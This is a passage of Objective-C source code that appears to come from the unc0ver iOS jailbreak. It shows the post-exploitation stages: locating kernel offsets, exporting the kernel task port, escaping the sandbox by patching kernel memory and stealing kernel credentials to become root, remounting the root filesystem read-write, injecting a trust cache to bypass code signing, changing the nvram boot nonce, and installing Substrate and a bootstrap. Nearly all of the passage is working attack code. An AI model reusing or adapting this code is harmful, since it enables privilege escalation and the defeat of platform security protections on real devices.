        LOG("zone_map_ref = "ADDR"", GETOFFSET(zone_map_ref));
        _assert(ISADDR(GETOFFSET(zone_map_ref)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find vfs_context_current offset.", nil));
        SETOFFSET(vfs_context_current, find_vfs_context_current());
        LOG("vfs_context_current = "ADDR"", GETOFFSET(vfs_context_current));
        _assert(ISADDR(GETOFFSET(vfs_context_current)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find vnode_lookup offset.", nil));
        SETOFFSET(vnode_lookup, find_vnode_lookup());
        LOG("vnode_lookup = "ADDR"", GETOFFSET(vnode_lookup));
        _assert(ISADDR(GETOFFSET(vnode_lookup)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find vnode_put offset.", nil));
        SETOFFSET(vnode_put, find_vnode_put());
        LOG("vnode_put = "ADDR"", GETOFFSET(vnode_put));
        _assert(ISADDR(GETOFFSET(vnode_put)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find kernel_task offset.", nil));
        SETOFFSET(kernel_task, find_kernel_task());
        LOG("kernel_task = "ADDR"", GETOFFSET(kernel_task));
        _assert(ISADDR(GETOFFSET(kernel_task)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find shenanigans offset.", nil));
        SETOFFSET(shenanigans, find_shenanigans());
        LOG("shenanigans = "ADDR"", GETOFFSET(shenanigans));
        _assert(ISADDR(GETOFFSET(shenanigans)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find find_lck_mtx_lock offset.", nil));
        SETOFFSET(lck_mtx_lock, find_lck_mtx_lock());
        LOG("lck_mtx_lock = "ADDR"", GETOFFSET(lck_mtx_lock));
        _assert(ISADDR(GETOFFSET(lck_mtx_lock)), message, true);
        SETMESSAGE(NSLocalizedString(@"Failed to find lck_mtx_unlock offset.", nil));
        SETOFFSET(lck_mtx_unlock, find_lck_mtx_unlock());
        LOG("lck_mtx_unlock = "ADDR"", GETOFFSET(lck_mtx_unlock));
        _assert(ISADDR(GETOFFSET(lck_mtx_unlock)), message, true);
        LOG("Successfully found offsets.");
    }
    
    UPSTAGE();
    
    {
        // Deinitialize patchfinder64.
        
        LOG("Deinitializing patchfinder64...");
        SETMESSAGE(NSLocalizedString(@"Failed to deinitialize patchfinder64.", nil));
        term_kernel();
        LOG("Successfully deinitialized patchfinder64.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.export_kernel_task_port) {
            // Export kernel task port.
            LOG("Exporting kernel task port...");
            SETMESSAGE(NSLocalizedString(@"Failed to export kernel task port.", nil));
            make_host_into_host_priv();
            LOG("Successfully exported kernel task port.");
        } else {
            // Unexport kernel task port.
            LOG("Unexporting kernel task port...");
            SETMESSAGE(NSLocalizedString(@"Failed to unexport kernel task port.", nil));
            make_host_priv_into_host();
            LOG("Successfully unexported kernel task port.");
        }
    }
    
    UPSTAGE();
    
    {
        // Escape Sandbox.
        static uint64_t ShenanigansPatch = 0xca13feba37be;
        
        LOG("Escaping Sandbox...");
        SETMESSAGE(NSLocalizedString(@"Failed to escape sandbox.", nil));
        myProcAddr = get_proc_struct_for_pid(myPid);
        LOG("myProcAddr = "ADDR"", myProcAddr);
        _assert(ISADDR(myProcAddr), message, true);
        kernelCredAddr = get_kernel_cred_addr();
        LOG("kernelCredAddr = "ADDR"", kernelCredAddr);
        _assert(ISADDR(kernelCredAddr), message, true);
        Shenanigans = ReadKernel64(GETOFFSET(shenanigans));
        LOG("Shenanigans = "ADDR"", Shenanigans);
        _assert(ISADDR(Shenanigans), message, true);
        WriteKernel64(GETOFFSET(shenanigans), ShenanigansPatch);
        myOriginalCredAddr = give_creds_to_process_at_addr(myProcAddr, kernelCredAddr);
        LOG("myOriginalCredAddr = "ADDR"", myOriginalCredAddr);
        _assert(ISADDR(myOriginalCredAddr), message, true);
        _assert(setuid(0) == ERR_SUCCESS, message, true);
        _assert(getuid() == 0, message, true);
        set_platform_binary(myProcAddr);
        LOG("Successfully escaped Sandbox.");
    }
    
    UPSTAGE();
    
    {
        // Write a test file to UserFS.
        
        LOG("Writing a test file to UserFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to write a test file to UserFS.", nil));
        const char *testFile = [NSString stringWithFormat:@"/var/mobile/test-%lu.txt", time(NULL)].UTF8String;
        writeTestFile(testFile);
        LOG("Successfully wrote a test file to UserFS.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.dump_apticket) {
            NSString *originalFile = @"/System/Library/Caches/apticket.der";
            NSString *dumpFile = [homeDirectory stringByAppendingPathComponent:@"Documents/apticket.der"];
            if (![sha1sum(originalFile) isEqualToString:sha1sum(dumpFile)]) {
                // Dump APTicket.
                
                LOG("Dumping APTicket...");
                SETMESSAGE(NSLocalizedString(@"Failed to dump APTicket.", nil));
                NSData *fileData = [NSData dataWithContentsOfFile:originalFile];
                _assert(([fileData writeToFile:dumpFile atomically:YES]), message, true);
                LOG("Successfully dumped APTicket.");
            }
        }
    }
    
    UPSTAGE();
    
    {
        if (prefs.overwrite_boot_nonce) {
            // Unlock nvram.
            
            LOG("Unlocking nvram...");
            SETMESSAGE(NSLocalizedString(@"Failed to unlock nvram.", nil));
            _assert(unlocknvram() == ERR_SUCCESS, message, true);
            LOG("Successfully unlocked nvram.");
            
            const char *bootNonceKey = "com.apple.System.boot-nonce";
            if (runCommand("/usr/sbin/nvram", bootNonceKey, NULL) != ERR_SUCCESS ||
                strstr(lastSystemOutput.bytes, prefs.boot_nonce) == NULL) {
                // Set boot-nonce.
                
                LOG("Setting boot-nonce...");
                SETMESSAGE(NSLocalizedString(@"Failed to set boot-nonce.", nil));
                _assert(runCommand("/usr/sbin/nvram", [NSString stringWithFormat:@"%s=%s", bootNonceKey, prefs.boot_nonce].UTF8String, NULL) == ERR_SUCCESS, message, true);
                _assert(runCommand("/usr/sbin/nvram", [NSString stringWithFormat:@"%s=%s", kIONVRAMForceSyncNowPropertyKey, bootNonceKey].UTF8String, NULL) == ERR_SUCCESS, message, true);
                LOG("Successfully set boot-nonce.");
            }
            
            // Lock nvram.
            
            LOG("Locking nvram...");
            SETMESSAGE(NSLocalizedString(@"Failed to lock nvram.", nil));
            _assert(locknvram() == ERR_SUCCESS, message, true);
            LOG("Successfully locked nvram.");
        }
    }
    
    UPSTAGE();
    
    {
        // Initialize kexecute.
        
        LOG("Initializing kexecute...");
        SETMESSAGE(NSLocalizedString(@"Failed to initialize kexecute.", nil));
        init_kexecute();
        LOG("Successfully initialized kexecute.");
    }
    
    UPSTAGE();
    
    {
        // Remount RootFS.
        
        LOG("Remounting RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to remount RootFS.", nil));
        int rootfd = open("/", O_RDONLY);
        _assert(rootfd != -1, message, true);
        const char **snapshots = snapshot_list(rootfd);
        const char *origfs = "orig-fs";
        bool has_origfs = false;
        const char *thedisk = "/dev/disk0s1s1";
        if (snapshots == NULL) {
            close(rootfd);
            
            // Clear dev vnode's si_flags.
            
            LOG("Clearing dev vnode's si_flags...");
            SETMESSAGE(NSLocalizedString(@"Failed to clear dev vnode's si_flags.", nil));
            uint64_t devVnode = getVnodeAtPath(thedisk);
            LOG("devVnode = "ADDR"", devVnode);
            _assert(ISADDR(devVnode), message, true);
            uint64_t v_specinfo = ReadKernel64(devVnode + koffset(KSTRUCT_OFFSET_VNODE_VU_SPECINFO));
            LOG("v_specinfo = "ADDR"", v_specinfo);
            _assert(ISADDR(v_specinfo), message, true);
            WriteKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS), 0);
            uint32_t si_flags = ReadKernel32(v_specinfo + koffset(KSTRUCT_OFFSET_SPECINFO_SI_FLAGS));
            LOG("si_flags = 0x%x", si_flags);
            _assert(si_flags == 0, message, true);
            _assert(_vnode_put(devVnode) == ERR_SUCCESS, message, true);
            LOG("Successfully cleared dev vnode's si_flags.");
            
            // Mount system snapshot.
            
            LOG("Mounting system snapshot...");
            SETMESSAGE(NSLocalizedString(@"Unable to mount system snapshot.", nil));
            _assert(!is_mountpoint("/var/MobileSoftwareUpdate/mnt1"),
                    NSLocalizedString(@"RootFS already mounted, delete OTA file from Settings - Storage if present and reboot", nil), true);
            const char *systemSnapshotMountPoint = "/private/var/tmp/jb/mnt1";
            if (is_mountpoint(systemSnapshotMountPoint)) {
                _assert(unmount(systemSnapshotMountPoint, MNT_FORCE) == ERR_SUCCESS, message, true);
            }
            _assert(clean_file(systemSnapshotMountPoint), message, true);
            _assert(ensure_directory(systemSnapshotMountPoint, 0, 0755), message, true);
            const char *argv[] = {"/sbin/mount_apfs", thedisk, systemSnapshotMountPoint, NULL};
            _assert(runCommandv(argv[0], 3, argv, ^(pid_t pid) {
                uint64_t procStructAddr = get_proc_struct_for_pid(pid);
                LOG("procStructAddr = "ADDR"", procStructAddr);
                _assert(ISADDR(procStructAddr), message, true);
                give_creds_to_process_at_addr(procStructAddr, kernelCredAddr);
            }) == ERR_SUCCESS, message, true);
            const char *systemSnapshotLaunchdPath = [@(systemSnapshotMountPoint) stringByAppendingPathComponent:@"sbin/launchd"].UTF8String;
            _assert(waitForFile(systemSnapshotLaunchdPath) == ERR_SUCCESS, message, true);
            LOG("Successfully mounted system snapshot.");
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot...");
            SETMESSAGE(NSLocalizedString(@"Unable to rename system snapshot.", nil));
            rootfd = open(systemSnapshotMountPoint, O_RDONLY);
            _assert(rootfd != -1, message, true);
            snapshots = snapshot_list(rootfd);
            _assert(snapshots != NULL, message, true);
            if (snapshots != NULL) {
                free(snapshots);
                snapshots = NULL;
            }
            char *systemSnapshot = copySystemSnapshot();
            _assert(systemSnapshot != NULL, message, true);
            _assert(fs_snapshot_rename(rootfd, systemSnapshot, origfs, 0) == ERR_SUCCESS, message, true);
            free(systemSnapshot);
            systemSnapshot = NULL;
            LOG("Successfully renamed system snapshot.");
            
            // Reboot.
            close(rootfd);
            
            LOG("Rebooting...");
            SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
            NOTICE(NSLocalizedString(@"The system snapshot has been successfully renamed. The device will be rebooted now.", nil), true, false);
            unmount(systemSnapshotMountPoint, MNT_FORCE);
            _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
            LOG("Successfully rebooted.");
        } else {
            LOG("APFS Snapshots:");
            for (const char **snapshot = snapshots; *snapshot; snapshot++) {
                if (strcmp(origfs, *snapshot) == 0) {
                    has_origfs = true;
                }
                LOG("%s", *snapshot);
            }
        }
        uint64_t rootfs_vnode = getVnodeAtPath("/");
        LOG("rootfs_vnode = "ADDR"", rootfs_vnode);
        _assert(ISADDR(rootfs_vnode), message, true);
        uint64_t v_mount = ReadKernel64(rootfs_vnode + koffset(KSTRUCT_OFFSET_VNODE_V_MOUNT));
        LOG("v_mount = "ADDR"", v_mount);
        _assert(ISADDR(v_mount), message, true);
        uint32_t v_flag = ReadKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG));
        if ((v_flag & (MNT_RDONLY | MNT_NOSUID))) {
            v_flag = v_flag & ~(MNT_RDONLY | MNT_NOSUID);
            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag & ~MNT_ROOTFS);
            _assert(runCommand("/sbin/mount", "-u", thedisk, NULL) == ERR_SUCCESS, message, true);
            WriteKernel32(v_mount + koffset(KSTRUCT_OFFSET_MOUNT_MNT_FLAG), v_flag);
        }
        _assert(_vnode_put(rootfs_vnode) == ERR_SUCCESS, message, true);
        NSString *file = [NSString stringWithContentsOfFile:@"/.installed_unc0ver" encoding:NSUTF8StringEncoding error:nil];
        needStrap = (file == nil ||
                    (![file isEqualToString:@""] &&
                    ![file isEqualToString:[NSString stringWithFormat:@"%f\n", kCFCoreFoundationVersionNumber]]))
                    && access("/electra", F_OK) != ERR_SUCCESS;
        if (needStrap)
            LOG("We need strap");
        if (snapshots != NULL && needStrap && !has_origfs) {
            // Create system snapshot.
            
            LOG("Creating system snapshot...");
            SETMESSAGE(NSLocalizedString(@"Unable to create system snapshot.  Delete OTA file from Settings - Storage if present", nil));
            _assert(fs_snapshot_create(rootfd, origfs, 0) == ERR_SUCCESS, message, true);
            _assert(snapshot_check(rootfd, origfs), message, true);
            LOG("Successfully created system snapshot.");
        }
        close(rootfd);
        LOG("Successfully remounted RootFS.");
    }
    
    UPSTAGE();
    
    {
        // Deinitialize kexecute.
        
        LOG("Deinitializing kexecute...");
        SETMESSAGE(NSLocalizedString(@"Failed to deinitialize kexecute.", nil));
        term_kexecute();
        LOG("Successfully deinitialized kexecute.");
    }
    
    UPSTAGE();
    
    {
        // Write a test file to RootFS.
        
        LOG("Writing a test file to RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to write a test file to RootFS.", nil));
        const char *testFile = [NSString stringWithFormat:@"/test-%lu.txt", time(NULL)].UTF8String;
        writeTestFile(testFile);
        LOG("Successfully wrote a test file to RootFS.");
    }
    
    UPSTAGE();
    
    {
        // Copy over our resources to RootFS.
        
        LOG("Copying over our resources to RootFS...");
        SETMESSAGE(NSLocalizedString(@"Failed to copy over our resources to RootFS.", nil));
        _assert(ensure_directory("/jb", 0, 0755), message, true);
        _assert(chdir("/jb") == ERR_SUCCESS, message, true);
        
        _assert(chdir("/") == ERR_SUCCESS, message, true);
        needResources = needStrap || !verifySums(@"/var/lib/dpkg/info/jailbreak-resources.md5sums", HASHTYPE_MD5);
        if (needResources)
            LOG(@"We need resources");

        needSubstrate = ( needStrap ||
                         (access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS) ||
                         !verifySums(@"/var/lib/dpkg/info/mobilesubstrate.md5sums", HASHTYPE_MD5)
                         );
        if (needSubstrate)
            LOG(@"We need substrate");
        _assert(chdir("/jb") == ERR_SUCCESS, message, true);
                
        // These don't need to lay around
        clean_file("/Library/LaunchDaemons/jailbreakd.plist");
        clean_file("/jb/jailbreakd.plist");
        clean_file("/jb/amfid_payload.dylib");
        clean_file("/jb/libjailbreak.dylib");

        LOG("Successfully copied over our resources to RootFS.");
    }
    
    UPSTAGE();
    
    {
        if (prefs.restore_rootfs) {
            SETMESSAGE(NSLocalizedString(@"Failed to Restore RootFS.", nil));
            
            // Rename system snapshot.
            
            LOG("Renaming system snapshot back...");
            NOTICE(NSLocalizedString(@"Will restore RootFS. This may take a while. Don't exit the app and don't let the device lock.", nil), 1, 1);
            SETMESSAGE(NSLocalizedString(@"Unable to mount or rename system snapshot.  Delete OTA file from Settings - Storage if present", nil));
            int rootfd = open("/", O_RDONLY);
            _assert(rootfd != -1, message, true);
            const char **snapshots = snapshot_list(rootfd);
            _assert(snapshots != NULL, message, true);
            const char *snapshot = *snapshots;
            LOG("%s", snapshot);
            _assert(snapshot != NULL, message, true);
            if (kCFCoreFoundationVersionNumber < 1452.23) {
                const char *systemSnapshotMountPoint = "/private/var/tmp/jb/mnt2";
                if (is_mountpoint(systemSnapshotMountPoint)) {
                    _assert(unmount(systemSnapshotMountPoint, MNT_FORCE) == ERR_SUCCESS, message, true);
                }
                _assert(clean_file(systemSnapshotMountPoint), message, true);
                _assert(ensure_directory(systemSnapshotMountPoint, 0, 0755), message, true);
                _assert(fs_snapshot_mount(rootfd, systemSnapshotMountPoint, snapshot, 0) == ERR_SUCCESS, message, true);
                const char *systemSnapshotLaunchdPath = [@(systemSnapshotMountPoint) stringByAppendingPathComponent:@"sbin/launchd"].UTF8String;
                _assert(waitForFile(systemSnapshotLaunchdPath) == ERR_SUCCESS, message, true);
                NSString *rsync_tar = pathForResource(@"rsync.tar");
                _assert(rsync_tar != nil, message, true);
                ArchiveFile *rsync = [ArchiveFile archiveWithFile:rsync_tar];
                _assert(rsync != nil, message, true);
                _assert([rsync extractToPath:@"/jb"], message, true);
                _assert(injectTrustCache(@[@"/jb/rsync"], GETOFFSET(trust_chain)) == ERR_SUCCESS, message, true);
                _assert(runCommand("/jb/rsync", "-vaxcH", "--progress", "--delete-after", "--exclude=/Developer", [@(systemSnapshotMountPoint) stringByAppendingPathComponent:@"."].UTF8String, "/", NULL) == 0, message, true);
                unmount(systemSnapshotMountPoint, MNT_FORCE);
            } else {
                char *systemSnapshot = copySystemSnapshot();
                _assert(systemSnapshot != NULL, message, true);
                _assert(fs_snapshot_rename(rootfd, snapshot, systemSnapshot, 0) == ERR_SUCCESS, message, true);
                free(systemSnapshot);
                systemSnapshot = NULL;
            }
            close(rootfd);
            free(snapshots);
            snapshots = NULL;
            LOG("Successfully renamed system snapshot back.");
            
            // Clean up.
            
            LOG("Cleaning up...");
            SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
            static const char *cleanUpFileList[] = {
                "/var/cache",
                "/var/lib",
                "/var/stash",
                "/var/db/stash",
                "/var/mobile/Library/Cydia",
                "/var/mobile/Library/Caches/com.saurik.Cydia",
                NULL
            };
            for (const char **file = cleanUpFileList; *file != NULL; file++) {
                clean_file(*file);
            }
            LOG("Successfully cleaned up.");
            
            // Disallow SpringBoard to show non-default system apps.
            
            LOG("Disallowing SpringBoard to show non-default system apps...");
            SETMESSAGE(NSLocalizedString(@"Failed to disallow SpringBoard to show non-default system apps.", nil));
            NSString *SpringBoardPreferencesFile = @"/var/mobile/Library/Preferences/com.apple.springboard.plist";
            NSString *SpringBoardShowNonDefaultSystemAppsKey = @"SBShowNonDefaultSystemApps";
            _assert(modifyPlist(SpringBoardPreferencesFile, ^(id plist) {
                plist[SpringBoardShowNonDefaultSystemAppsKey] = @NO;
            }), message, true);
            
            // Disable RootFS Restore.
            
            LOG("Disabling RootFS Restore...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable RootFS Restore.", nil));
            _assert(modifyPlist(prefsFile, ^(id plist) {
                plist[K_RESTORE_ROOTFS] = @NO;
            }), message, true);
            LOG("Successfully disabled RootFS Restore.");
            
            // Reboot.
            
            LOG("Rebooting...");
            SETMESSAGE(NSLocalizedString(@"Failed to reboot.", nil));
            NOTICE(NSLocalizedString(@"RootFS has successfully been restored. The device will be restarted.", nil), true, false);
            _assert(reboot(RB_QUICK) == ERR_SUCCESS, message, true);
            LOG("Successfully rebooted.");
        }
    }
    
    UPSTAGE();
    
    {
        // Inject trust cache
        
        LOG("Injecting trust cache...");
        SETMESSAGE(NSLocalizedString(@"Failed to inject trust cache.", nil));
        LOG("trust_chain = 0x%llx", GETOFFSET(trust_chain));
        NSArray *resources = nil;
        if (!needResources) {
            resources = [NSArray arrayWithContentsOfFile:@"/usr/share/undecimus/injectme.plist"];
        }
        if (!needSubstrate) {
            resources = [@[@"/usr/libexec/substrate"] arrayByAddingObjectsFromArray:resources];
        }
        _assert(injectTrustCache(resources, GETOFFSET(trust_chain)) == ERR_SUCCESS, message, true);
        LOG("Successfully injected trust cache.");
    }
    
    UPSTAGE();
    
    {
        // Log slide.
        
        LOG("Logging slide...");
        SETMESSAGE(NSLocalizedString(@"Failed to log slide.", nil));
        NSData *fileData = [[NSString stringWithFormat:@(ADDR "\n"), kernel_slide] dataUsingEncoding:NSUTF8StringEncoding];
        if (![[NSData dataWithContentsOfFile:@"/var/tmp/slide.txt"] isEqual:fileData]) {
            _assert(clean_file("/var/tmp/slide.txt"), message, true);
            _assert(create_file_data("/var/tmp/slide.txt", 0, 0644, fileData), message, false);
        }
        LOG("Successfully logged slide.");
    }
    
    UPSTAGE();
    
    {
        // Log ECID.
        
        LOG("Logging ECID...");
        SETMESSAGE(NSLocalizedString(@"Failed to log ECID.", nil));
        CFStringRef value = MGCopyAnswer(kMGUniqueChipID);
        LOG("ECID = %@", value);
        _assert(value != nil, message, true);
        _assert(modifyPlist(prefsFile, ^(id plist) {
            plist[K_ECID] = CFBridgingRelease(value);
        }), message, true);
        LOG("Successfully logged ECID.");
    }
    
    UPSTAGE();
    
    {
        // Log offsets.
        
        LOG("Logging offsets...");
        SETMESSAGE(NSLocalizedString(@"Failed to log offsets.", nil));
        NSMutableDictionary *dictionary = [NSMutableDictionary new];
        dictionary[@"KernelBase"] = ADDRSTRING(kernel_base);
        dictionary[@"KernelSlide"] = ADDRSTRING(kernel_slide);
        dictionary[@"TrustChain"] = ADDRSTRING(GETOFFSET(trust_chain));
        dictionary[@"OSBooleanTrue"] = ADDRSTRING(ReadKernel64(GETOFFSET(OSBoolean_True)));
        dictionary[@"OSBooleanFalse"] = ADDRSTRING(ReadKernel64(GETOFFSET(OSBoolean_True)) + 0x8);
        dictionary[@"OSUnserializeXML"] = ADDRSTRING(GETOFFSET(osunserializexml));
        dictionary[@"Smalloc"] = ADDRSTRING(GETOFFSET(smalloc));
        dictionary[@"AddRetGadget"] = ADDRSTRING(GETOFFSET(add_x0_x0_0x40_ret));
        dictionary[@"ZoneMapOffset"] = ADDRSTRING(GETOFFSET(zone_map_ref));
        dictionary[@"VfsContextCurrent"] = ADDRSTRING(GETOFFSET(vfs_context_current));
        dictionary[@"VnodeLookup"] = ADDRSTRING(GETOFFSET(vnode_lookup));
        dictionary[@"VnodePut"] = ADDRSTRING(GETOFFSET(vnode_put));
        dictionary[@"KernProc"] = ADDRSTRING(ReadKernel64(GETOFFSET(kernel_task))  + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        dictionary[@"KernelTask"] = ADDRSTRING(GETOFFSET(kernel_task));
        dictionary[@"Shenanigans"] = ADDRSTRING(GETOFFSET(shenanigans));
        dictionary[@"LckMtxLock"] = ADDRSTRING(GETOFFSET(lck_mtx_lock));
        dictionary[@"LckMtxUnlock"] = ADDRSTRING(GETOFFSET(lck_mtx_unlock));
        if (![[NSMutableDictionary dictionaryWithContentsOfFile:@"/jb/offsets.plist"] isEqual:dictionary]) {
            _assert(([dictionary writeToFile:@"/jb/offsets.plist" atomically:YES]), message, true);
            _assert(init_file("/jb/offsets.plist", 0, 0644), message, true);
        }
        LOG("Successfully logged offsets.");
    }
    
    UPSTAGE();
    
    {
        // Set HSP4.
        
        LOG("Setting HSP4...");
        SETMESSAGE(NSLocalizedString(@"Failed to set HSP4.", nil));
        remap_tfp0_set_hsp4(&tfp0);
        LOG("Successfully set HSP4.");
    }
    
    UPSTAGE();
    
    {
        // Update version string.
        
        if (!jailbreakEnabled()) {
            LOG("Updating version string...");
            SETMESSAGE(NSLocalizedString(@"Failed to update version string.", nil));
            struct utsname u;
            _assert(uname(&u) == ERR_SUCCESS, message, true);
            const char *kernelVersionString = [NSString stringWithFormat:@"%s %s", u.version, DEFAULT_VERSION_STRING].UTF8String;
            for (int i = 0; !(i >= 5 || strstr(u.version, kernelVersionString) != NULL); i++) {
                _assert(updateVersionString(kernelVersionString) == ERR_SUCCESS, message, true);
                _assert(uname(&u) == ERR_SUCCESS, message, true);
            }
            _assert(strstr(u.version, kernelVersionString) != NULL, message, true);
            LOG("Successfully updated version string.");
        }
    }
    
    UPSTAGE();
    
    {
        // Load Substrate
        
        // Set Disable Loader.
        LOG("Setting Disable Loader...");
        SETMESSAGE(NSLocalizedString(@"Failed to set Disable Loader.", nil));
        if (prefs.load_tweaks) {
            clean_file("/var/tmp/.substrated_disable_loader");
        } else {
            _assert(create_file("/var/tmp/.substrated_disable_loader", 0, 644), message, true);
        }
        LOG("Successfully set Disable Loader.");

        // Extract Substrate if necessary
        if (needSubstrate) {
            LOG("Extracting substrate from deb...");
            SETMESSAGE(NSLocalizedString(@"Failed to extract Substrate from deb.", nil));
            NSString *substrate_deb = pathForResource(@"mobilesubstrate.deb");
            _assert(substrate_deb != nil, message, true);
            ArchiveFile *substrate = [ArchiveFile archiveWithFile:substrate_deb];
            _assert(substrate != nil, message, true);
            _assert([substrate extract:@"data.tar.lzma" toPath:@"/jb/substrate.tar.lzma"], message, true);
            ArchiveFile *substrate_data = [ArchiveFile archiveWithFile:@"/jb/substrate.tar.lzma"];
            _assert(substrate_data != nil, message, true);
            _assert([substrate_data extractToPath:@"/"], message, true);
            _assert(injectTrustCache(@[@"/usr/libexec/substrate"], GETOFFSET(trust_chain)) == ERR_SUCCESS, message, true);
            LOG("Successfully extracted substrate");
        }
        // We don't trust server plugins from resources if they aren't valid
        if (needResources) {
            LOG("Cleaning out un-trusted resources...");
            SETMESSAGE(NSLocalizedString(@"Failed to clean out un-trusted resources.", nil));
            NSString *list = [NSString stringWithContentsOfFile:@"/usr/lib/dpkg/info/jailbreak-resources.list" encoding:NSUTF8StringEncoding error:nil];
            if (list) {
                for (NSString *file in [list componentsSeparatedByString:@"\n"]) {
                    if ([[file stringByDeletingPathExtension] isEqualToString:@"/Library/MobileSubstrate/ServerPlugins"]) {
                        clean_file(file.UTF8String);
                    }
                }
            }
            LOG("Successfully cleaned out un-trusted resources.");
        }
        // Run substrate
        LOG("Starting Substrate...");
        SETMESSAGE(NSLocalizedString(@"Failed to start Substrate.", nil));
        _assert(runCommand("/usr/libexec/substrate", NULL) == ERR_SUCCESS, message, true);
        LOG("Successfully started Substrate.");
    }
    
    UPSTAGE();
    
    {
        // Make sure firmware-sbin package is not corrupted.
        NSString *file = [NSString stringWithContentsOfFile:@"/var/lib/dpkg/info/firmware-sbin.list" encoding:NSUTF8StringEncoding error:nil];
        if ([file rangeOfString:@"/sbin/fstyp"].location != NSNotFound || [file rangeOfString:@"\n\n"].location != NSNotFound) {
            // This is not a stock file for iOS11+
            file = [file stringByReplacingOccurrencesOfString:@"/sbin/fstyp\n" withString:@""];
            file = [file stringByReplacingOccurrencesOfString:@"\n\n" withString:@"\n"];
            [file writeToFile:@"/var/lib/dpkg/info/firmware-sbin.list" atomically:YES encoding:NSUTF8StringEncoding error:nil];
        }

        // Extract bootstrap.
        LOG("Extracting bootstrap...");
        SETMESSAGE(NSLocalizedString(@"Failed to extract bootstrap.", nil));
        if (needStrap) {
            NSString *strap_tar = pathForResource(@"strap.tar.lzma");
            _assert(strap_tar != nil, message, true);
            ArchiveFile *strap = [ArchiveFile archiveWithFile:strap_tar];
            _assert(strap != nil, message, true);
            _assert([strap extractToPath:@"/" overWriteDirectories:NO], message, true);
            rv = system("/usr/libexec/cydia/firmware.sh");
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            extractResources();
            rv = runCommand("/usr/bin/dpkg", "--configure", "-a", NULL);
            _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
            if (!prefs.run_uicache) {
                prefs.run_uicache = true;
                _assert(modifyPlist(prefsFile, ^(id plist) {
                    plist[K_REFRESH_ICON_CACHE] = @YES;
                }), message, true);
            }
        } else {
            if (!needResources) {
                updatedResources = compareInstalledVersion("jailbreak-resources", "lt", bundledResources.UTF8String);
            }
            bool xz_installed = debIsInstalled("xz");
            if (access("/usr/local/lib/liblzma.5.dylib", F_OK) != ERR_SUCCESS) {
                LOG("Extracting XZ");
                xz_installed = false;
                ArchiveFile *xz_deb = [ArchiveFile archiveWithFile:pathForResource(@"xz.deb")];
                _assert(xz_deb != nil, message, true);
                _assert([xz_deb extract:@"data.tar.lzma" toPath:@"/jb/xz.tar.lzma"], message, true);
                ArchiveFile *xz = [ArchiveFile archiveWithFile:@"/jb/xz.tar.lzma"];
                _assert(xz != nil, message, true);
                _assert([xz extractToPath:@"/"], message, true);
                clean_file("/jb/xz.tar.lzma");
            } else {
                LOG("Not extracting XZ");
            }
            // Now that things are running, let's install the deb for the files we just extracted
            if (needResources || updatedResources) {
                extractResources();
            } else if (needSubstrate) {
                if (debIsInstalled("com.ex.substitute")) {
                    _assert(removePkg("com.ex.substitute", true), message, true);
                }
                _assert(installDebs(@[@"substrate-safemode.deb", @"mobilesubstrate.deb"], true), message, true);
            }
            if (!xz_installed || !debIsInstalled("lzma") || compareInstalledVersion("lzma", "lt", "2:0")) {
                installDebs(@[@"lzma.deb", @"xz.deb"], false);
            }
            if (!debIsConfigured("libapt-pkg5.0") || !debIsConfigured("libapt") || !debIsConfigured("apt-key") || !debIsConfigured("lz4")) {
                NSMutableArray *toRemove = [NSMutableArray new];
                if (debIsInstalled("apt7-lib")) {
                    [toRemove addObject:@"apt7-lib"];
                }
                if (debIsInstalled("apt7")) {
                    [toRemove addObject:@"apt7"];
                }
                if (debIsInstalled("apt7-key")) {
                    [toRemove addObject:@"apt7-key"];
                }
                if (toRemove.count > 0) {
                    _assert(removePkgs(toRemove, true), message, true);
                }
                _assert(installDebs(@[@"libapt.deb", @"libapt-pkg.deb", @"apt-key.deb", @"lz4.deb"], true), message, true);
            }
            if (pkgIsBy("CoolStar", "dpkg")) {
                _assert(installDeb("dpkg.deb", true), message, true);
            }
        }
        NSData *file_data = [[NSString stringWithFormat:@"%f\n", kCFCoreFoundationVersionNumber] dataUsingEncoding:NSUTF8StringEncoding];
        if (![[NSData dataWithContentsOfFile:@"/.installed_unc0ver"] isEqual:file_data]) {
            _assert(clean_file("/.installed_unc0ver"), message, true);
            _assert(create_file_data("/.installed_unc0ver", 0, 0644, file_data), message, true);
        }
        clean_file("/jb/tar");
        clean_file("/jb/lzma");
        clean_file("/jb/substrate.tar.lzma");
        clean_file("/electra");
        clean_file("/.bootstrapped_electra");
        clean_file("/usr/lib/libjailbreak.dylib");
        _assert(chdir("/jb") == ERR_SUCCESS, message, true);
        LOG("Successfully extracted bootstrap.");
    }
    
    UPSTAGE();
    
    {
        if (access("/.cydia_no_stash", F_OK) != ERR_SUCCESS) {
            // Disable stashing.
            
            LOG("Disabling stashing...");
            SETMESSAGE(NSLocalizedString(@"Failed to disable stashing.", nil));
            _assert(create_file("/.cydia_no_stash", 0, 0644), message, true);
            LOG("Successfully disabled stashing.");
        }
    }
    
    UPSTAGE();
    
    {
        // Repair filesystem.
        
        LOG("Repairing filesystem...");
        SETMESSAGE(NSLocalizedString(@"Failed to repair filesystem.", nil));
        _assert(ensure_directory("/Library/Caches", 0, S_ISVTX | S_IRWXU | S_IRWXG | S_IRWXO), message, true);
